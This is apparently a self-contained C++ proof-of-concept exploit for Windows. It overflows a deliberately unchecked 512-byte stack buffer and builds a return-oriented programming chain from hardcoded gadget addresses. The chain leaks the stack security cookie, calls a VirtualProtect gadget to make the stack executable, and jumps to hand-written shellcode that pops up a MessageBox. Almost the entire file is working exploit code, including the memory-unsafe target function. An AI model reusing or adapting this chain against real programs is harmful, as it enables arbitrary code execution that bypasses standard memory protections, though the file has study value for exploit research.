
#include <Windows.h>
#include <iostream>
#include <iomanip>
#include <vector>
#include <array>
#include <numeric>
#include <algorithm>
#include <cassert>


char overflow_target(void* src, size_t size)
{
  char buffer[512];
  memcpy(buffer, src, size);
  // prevent compiler opt.
  return buffer[0];
}


// helper struct to check that each slot is only used once
// and to prevent the use of dynamically overwritten slots
struct overflow_t
{
  #define uninitialized_value 0xCCCCCCCCCCCCCCCCull

  overflow_t()
  {
    std::fill(ropbuf.begin(), ropbuf.end(), uninitialized_value);
  }

  struct rop_slot_ref_t
  {
    rop_slot_ref_t(uint64_t& value, size_t idx)
      : value(value), idx(idx) {}

    rop_slot_ref_t& operator=(uint64_t x)
    {
      if (value != uninitialized_value) {
        std::cout << "slot[" << std::setw(3) << idx << "] -> already used" << std::endl;
      } else {
        value = x;
      }
      return *this;
    }

  protected:
    uint64_t& value;
    size_t idx;
  };

  rop_slot_ref_t operator[](size_t idx)
  {
    return rop_slot_ref_t {ropbuf[idx], idx};
  }

  size_t nb_slots() const
  {
    return ropbuf.size();
  }

  std::array<uint64_t, 140> ropbuf;
};


int main()
{
  size_t popped_rax_i = 0;
  size_t popped_rsi_i = 0;
  size_t popped_rdx_i = 0;
  size_t popped_rcx_i = 0;
  size_t popped_rbx_i = 0;
  size_t popped_rsp_i = 0;

  overflow_t buf {};
  
  

  // Since the target is compiled with the poc
  // the return address slot can change.
  // I thus decided to use an array of jump gadgets
  // at the minimal offset (end of legit buffer).
  // Please configure for your own target if this is not enough.
  // In debug mine is at +0x280.. (slot 80)
  const size_t min_chainstart = 65;

  size_t i = min_chainstart;
  buf[i++] = 0x404093; // add rsp, 0x78; ret
  buf[i++] = 0x404093; // add rsp, 0x78; ret
  buf[i++] = 0x403184; // add rsp, 0x68; ret
  buf[i++] = 0x403184; // add rsp, 0x68; ret
  buf[i++] = 0x402b34; // add rsp, 0x58; ret 
  buf[i++] = 0x402b34; // add rsp, 0x58; ret 
  buf[i++] = 0x4028f9; // add rsp, 0x48; ret
  buf[i++] = 0x4028f9; // add rsp, 0x48; ret
  buf[i++] = 0x40281c; // add rsp, 0x38; ret
  buf[i++] = 0x40281c; // add rsp, 0x38; ret
  buf[i++] = 0x404e3d; // add rsp, 0x28; ret
  buf[i++] = 0x404e3d; // add rsp, 0x28; ret
  buf[i++] = 0x402820; // ret
  buf[i++] = 0x4028fc; // ret
  buf[i++] = 0x402820; // ret
  buf[i++] = 0x4028fc; // ret
  buf[i++] = 0x402820; // ret
  buf[i++] = 0x4028fc; // ret

  //--------------------------------------
  // ROPCHAIN start
  //--------------------------------------

  buf[i++] = 0x4108d3;
  // mov r13, qword [rsp+0x28]; /*dwSize*/
  buf[i+5] = buf.nb_slots() * 8 + 0x10;
  // mov r14, qword [rsp+0x20];
  buf[i+4] = 0;
  // add rsp, 0x48; ret
  i += 9;

  //--------------------------------------
  // Compute pBuffer-0x10 in rax + Set rdx to 0
  //--------------------------------------

  buf[i++] = 0x404c1a;
  // pop rsi ; ret
  buf[i] = 0;
  i += 1;

  // prep call
  buf[i++] = 0x402977;
  // pop rax ; ret
  popped_rax_i = i;
  i += 1;

  buf[i++] = 0x409aee;
  // lea rcx, qword [rsp+0x30];
  const size_t rel_sp_i = (i + 6);
  // add rax, r14 <- we did r14 := 0
  // mov rdx, rsi <- we did rsi := 0
  // call rax
  i -= 1;

  // skip retaddr
  buf[popped_rax_i] = 0x404eb7;
  // pop rdi; ret
  i += 1;

  buf[i++] = 0x405EE0; // function gadget
  // mov [rsp + 0x8], rcx; ret  (reads [rcx], undefines rax) <- safe read since rcx points in stack
  buf[i+1] = 0;

  buf[i++] = 0x402977;
  // pop rax ; ret
  // rax := rcx
  i += 1;

  const size_t offset_to_buf_minus10_div2 = (size_t)(-0x10 - (int64_t)rel_sp_i * 8) >> 1;

  buf[i++] = 0x00404eaa;
  // mov rcx, qword [rsp+0x08];
  buf[i+1] = offset_to_buf_minus10_div2;
  // mov qword [rax+0x20], rcx;
  buf[rel_sp_i+4] = 0;
  // add rsp, 0x10;
  i += 2;
  // pop rdi; ret
  i += 1;

  buf[i++] = 0x40619f;
  // lea rax, qword [rax+rcx*2]
  // mov qword [rsp+0x50], rax
  buf[i+10] = 0; // rel_sp + offset_to_bufstart_minus10_div2 * 2 == pBuffer - 0x10
  // mov rax, qword [rsp+0x50]
  // mov word [rax], 0x0000
  // mov eax, dword [rsp+0x20]
  // add rsp, 0x48; ret
  i += 9;

  // rax is undefined here but has been saved at buf[i+1]

  //--------------------------------------
  // Setup VirtualProtect lpAddress (rbx)
  //--------------------------------------

  buf[i++] = 0x409732;
  // pop rbx; ret
  // rbx := pBuffer - 0x10 
  i += 1;

  //--------------------------------------
  // Set rsp to (pBuffer - 0x10 + 0x18)
  // This is useful if the overflow is limited in size.
  //--------------------------------------

  // req: rcx >= rdx (satisfied since we've set rdx to 0 earlier)
  buf[i++] = 0x40A730;
  // mov[rsp + 0x18], rbx;
  popped_rbx_i = i + 3;
  // mov[rsp + 0x20], rdi;
  buf[i+4] = 0;

  // skip +2
  buf[i++] = 0x404eb7;
  // pop rdi; ret
  i += 1;

  buf[i++] = 0x40b745;  
  // pop rsp
  popped_rsp_i = i;
  // i = -2;
  // and al, 0x10 ; mov rdi, qword [rsp] ;
  // add rsp, 0x18 ; ret 
  i = 1;

  assert(popped_rsp_i == popped_rbx_i);

  // we'll use the rest of the overflow to store a string
  const size_t text_i = popped_rsp_i + 2;

  //--------------------------------------
  // Setup VirtualProtect gadget frame RBP (+lpflOldProtect)
  //--------------------------------------

  // prep call
  buf[i++] = 0x402977;
  // pop rax; ret
  popped_rax_i = i;
  i += 1;

  buf[i++] = 0x409aee;
  // lea rcx, qword [rsp+0x30];
  const size_t vprot_rbp_i = i + 6;
  // add rax, r14 <- we did r14 := 0
  // mov rdx, rsi <- we did rsi := 0
  // call rax
  i -= 1;

  // skip retaddr
  buf[popped_rax_i] = 0x40427a;
  // pop rbp; ret
  i += 1;

  buf[i++] = 0x405EE0;
  // mov [rsp + 0x8], rcx; ret   (reads [rcx], destroys rax)

  buf[i++] = 0x40427a;
  // pop rbp; ret
  // rbp := vprot_rbp_i
  i += 1;

  //--------------------------------------
  // VirtualProtect gadget frame
  //--------------------------------------

  const uintptr_t vprot_gadget_addr = 0x412C62;
  //--------------------------------------
  // vprotect_frame area
  // shellcode   buf[0..]
  // cookie;     buf[cookie_i]
  // free14;     buf[cookie_i + 1]
  // r15;        buf[cookie_i + 2]
  // r14;        buf[cookie_i + 3]
  // r13;        buf[cookie_i + 4]
  // rbp;        buf[cookie_i + 5]
  // retaddr;    buf[cookie_i + 6]   <- vprot will return to this value
  // redzone                  
  // rbx;        buf[cookie_i + 7]
  // rsi;        buf[cookie_i + 8]
  // rdi;        buf[cookie_i + 9]
  // r12;        buf[cookie_i + 10]
  //--------------------------------------
  const size_t cookie_i = vprot_rbp_i + 13;
  const size_t rdi_restore_i = cookie_i + 9;
  const size_t vprot_retaddr_i = cookie_i + 6;

  const size_t shellcode_start_i = vprot_rbp_i;
  // protect shellcode start while coding the rop
  // buf[vprot_rbp_i] = 0;

  //--------------------------------------
  // Retrieve the security cookie that protects
  // the epilogue of our VirtualProtect gadget
  //--------------------------------------

  // Get security cookie complement (side-effects are limited to [rsp+20h])

  buf[i++] = 0x4094E0;
  // _security_init_cookie(), stores rdi at rsp + 20h
  // rax := ~cookie_i
  buf[i+4] = 0; // overwritten

  // Complement it to get cookie (corrupts the cookie complement, but can be repaired by the shellcode)

  buf[i++] = 0x409504;
  // not rax
  // mov qword [0x0000000000416148], rax
  // mov rdi, qword [rsp+0x48]              < usable rdi assignment
  // add rsp, 0x28
  i += 5;

  //--------------------------------------
  // Write security cookie in the crafted frame
  //--------------------------------------

  // TODO: skip generator
  buf[i++] = 0x40281c;
  // add rsp, 0x38; ret
  i += 7;

  buf[i++] = 0x4028fc;
  // ret

  assert(cookie_i == i);

  buf[i++] = 0x40de79;
  // push rax
  i -= 1;
  // add rsp, 0x38; ret
  i += 7;

  assert(vprot_retaddr_i != i); // this is obviously reserved for roping
                              // after the call to the VirtualProtect gadget

  //--------------------------------------
  // Save vprot rbp (shellcode start)
  //--------------------------------------

  buf[i++] = 0x405EE0;
  // mov [rsp + 0x8], rcx; ret   (reads [rcx], undefines rax)
  size_t saved_rbp_i = i + 1;

  assert(saved_rbp_i == rdi_restore_i);

  // skip saved rsi
  buf[i++] = 0x404c1a;
  // pop rsi; ret
  i += 1;

  //--------------------------------------
  // Setup VirtualProtect flNewProtect (rsi)
  //--------------------------------------

  buf[i++] = 0x404c1a;
  // pop rsi; ret
  buf[i] = 0x40; /*PAGE_EXECUTE_READWRITE*/
  i += 1;

  //--------------------------------------
  // Set rsp to buffer start + 0x10
  //--------------------------------------

  // we can move stuff at buffer[0] if we lack some space here

  // req: rcx >= rdx
  // TOCHECK: satisfied ? rcx is vprot rbp, and rdx is still 0 ? 
  buf[i++] = 0x40A730;
  // mov[rsp + 0x18], rbx;
  popped_rbx_i = i + 3;
  // mov[rsp + 0x20], rdi;
  buf[i+4] = 0;

  // skip +2
  buf[i++] = 0x404eb7;
  // pop rdi; ret
  i += 1;

  buf[i++] = 0x4136d6;
  // pop rsp
  popped_rsp_i = i;
  buf[popped_rsp_i] = 0;
  // i = -2;
  // and al, 0x08;
  // add rsp, 0x10; ret
  i = 0;

  assert(popped_rsp_i == popped_rbx_i);

  //--------------------------------------
  // Call VirtualProtect Gadget
  //--------------------------------------

  buf[i++] = vprot_gadget_addr; // 0x412c62
  i = vprot_retaddr_i;
  // rbp is restored to buffer address by the epilogue :)

  //--------------------------------------
  // Jump to shellcode (let's ret to it actually)
  //--------------------------------------

  std::cout << "vprot_retaddr_i: " << vprot_retaddr_i << std::endl;
  std::cout << "shellcode start: " << shellcode_start_i << std::endl;

  assert(saved_rbp_i - i == 3);

  buf[i++] = 0x004136d9;
  // add rsp, 0x10
  i += 2;

  // ret -> return to shellcode 

  //--------------------------------------
  // Mini shellcode
  //--------------------------------------

  // the 4 bytes at +0x04 are overwritten to store old protect
  // but a small rel jump is 2 bytes so we are fine

  const size_t main_shellcode_i = 41; // chosen manually, good range of free slots

  // setup jump to main shellcode
  {
    size_t offset = (main_shellcode_i - shellcode_start_i) * 8;
    offset -= 8;
    uint64_t op = 0xE9 + ((offset - 5) << 8);

    buf[shellcode_start_i] = 0x06EB; // jump to big jmp
    buf[shellcode_start_i + 1] = op;
  }

  std::string strings = "User32.dll$MessageBoxA$hello from shellcode!";
  std::replace(strings.begin(), strings.end(), '$', '\0');

  {
    strings.resize((strings.size() + 7) & 0xFFF8, 0);
    auto pqw = (uint64_t*)strings.data();
    for (size_t i = 0; i < (strings.size() / 8); ++i) {
      buf[text_i + i] = pqw[i];
    }
  }

  std::vector<uint8_t> shellcode = {

    // get strings address (set up later)
    0x4C, 0x8D, 0x35, 0xCC, 0xCC, 0xCC, 0xCC, // lea r14, [rip+..]

    // align stack
    0x48, 0x83, 0xE4, 0xF8, // and rsp, 0xfffffffffffffff8
    // proper frame
    0x48, 0x89, 0xE5,       // mov rbp, rsp
    0x55,                   // push rbp
    0x48, 0x83, 0xEC, 0x20, // sub rsp, 0x20

    0x4D, 0x31, 0xFF, // xor r15, r15

    // load library
    0x4C, 0x89, 0xF1, // mov rcx, r14 "User32.dll"
    0x41, 0xFF, 0x97, 0xC0, 0x11, 0x40, 0x00, // call [r15 + 0x4011C0]

    // get proc addr of msgbox
    0x48, 0x89, 0xC1, // mov rcx, rax
    0x49, 0x8D, 0x56, 0x0B, // lea rdx, [r14 + 11] "MessageBoxA"
    0x41, 0xFF, 0x97, 0x68, 0x10, 0x40, 0x00, // call [r15 + 0x401068]

    // msgbox 
    0x48, 0x31, 0xC9, // xor rcx, rcx
    0x49, 0x8D, 0x56, 0x17, // lea rdx, [r14 + 11 + 12] "hello.."
    0x49, 0x89, 0xD0, // mov r8, rdx
    0x4D, 0x31, 0xC9, // xor r9, r9
    0xFF, 0xD0 // call rax
  };

  // string address offset
  uint32_t op_offset = main_shellcode_i * 8 + 7;
  uint32_t text_offset = (uint32_t)(text_i * 8);
  *(uint32_t*)(shellcode.data() + 3) = text_offset - op_offset;

  {
    shellcode.resize((shellcode.size() + 7) & 0xFFF8, 0);
    auto pqw = (uint64_t*)shellcode.data();
    for (size_t i = 0; i < (shellcode.size() + 7) / 8; ++i) {
      buf[main_shellcode_i + i] = pqw[i];
    }
  }

  //--------------------------------------
  // Time to exploit
  //--------------------------------------

  if (!LoadLibraryA("xinput1_3.dll"))
  {
    std::cout << "error: couldn't load xinput1_3.dll" << std::endl;
    return -1;
  }

  std::cout << overflow_target(buf.ropbuf.data(), sizeof(buf.ropbuf));

  return 0;
}


